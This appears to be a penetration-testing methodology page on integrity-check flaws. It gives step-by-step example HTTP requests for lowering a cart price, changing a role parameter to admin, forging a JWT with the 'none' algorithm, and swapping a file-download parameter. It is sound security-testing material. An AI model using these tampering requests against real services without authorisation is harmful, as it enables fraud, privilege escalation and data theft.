# Integrity Checks

## Check List

## Methodology

### Black Box

#### Client-Side Price Manipulation Without Server Validation

{% stepper %}
{% step %}
Login to your account
{% endstep %}

{% step %}
Add a product to the cart and intercept the request

```http
POST /api/cart/add HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"productId":101,"quantity":1,"price":100}
```
{% endstep %}

{% step %}
Observe that the price value is sent from client-side
{% endstep %}

{% step %}
Modify the price parameter

```http
{"productId":101,"quantity":1,"price":1}
```
{% endstep %}

{% step %}
Forward the modified request then Proceed to checkout and intercept the payment request

```http
POST /api/checkout HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"total":1,"paymentMethod":"wallet"}
```
{% endstep %}

{% step %}
If the server processes the payment using the manipulated price and order is confirmed at reduced cost, integrity validation is missing
{% endstep %}

{% step %}
If backend does not recalculate price independently, integrity check vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Hidden Role Parameter Trusted by Backend

{% stepper %}
{% step %}
Login as a normal user , Intercept profile update request

```http
POST /api/profile/update HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"username":"user1","role":"user"}
```
{% endstep %}

{% step %}
Modify the role parameter

```json
{"username":"user1","role":"admin"}
```
{% endstep %}

{% step %}
Forward the modified request, Access an admin-only endpoint

```http
GET /api/admin/dashboard HTTP/1.1
Host: target.com
Cookie: session=abc123
```
{% endstep %}

{% step %}
If access is granted or elevated privileges are applied, server trusts client-supplied role without integrity enforcement
{% endstep %}

{% step %}
If privilege escalation occurs due to tampered parameter, integrity checks are broken
{% endstep %}
{% endstepper %}

***

#### JWT Signature Not Properly Validated

{% stepper %}
{% step %}
Login and capture JWT token

```json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature
```
{% endstep %}

{% step %}
Decode JWT and modify payload (example: change role)

```json
{"user":"test","role":"admin"}
```
{% endstep %}

{% step %}
Re-encode token using "none" algorithm or weak secret , Replace Authorization header

```http
Authorization: Bearer modified_token
```
{% endstep %}

{% step %}
Send request to privileged endpoint

```http
GET /api/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer modified_token
```
{% endstep %}

{% step %}
If server accepts modified token without validating signature integrity, JWT integrity check is broken
{% endstep %}

{% step %}
If access to restricted data is granted, integrity vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### File Download Parameter Tampering

{% stepper %}
{% step %}
Login and access file download feature, Intercept request

```http
GET /download?file=invoice_123.pdf HTTP/1.1
Host: target.com
Cookie: session=abc123
```
{% endstep %}

{% step %}
Modify file parameter

```http
GET /download?file=invoice_124.pdf HTTP/1.1
Host: target.com
Cookie: session=abc123
```
{% endstep %}

{% step %}
Forward request, If unauthorized file is downloaded without access control validation, integrity and authorization validation is missing
{% endstep %}

{% step %}
If file access is determined solely by client-supplied filename without backend validation, integrity check vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
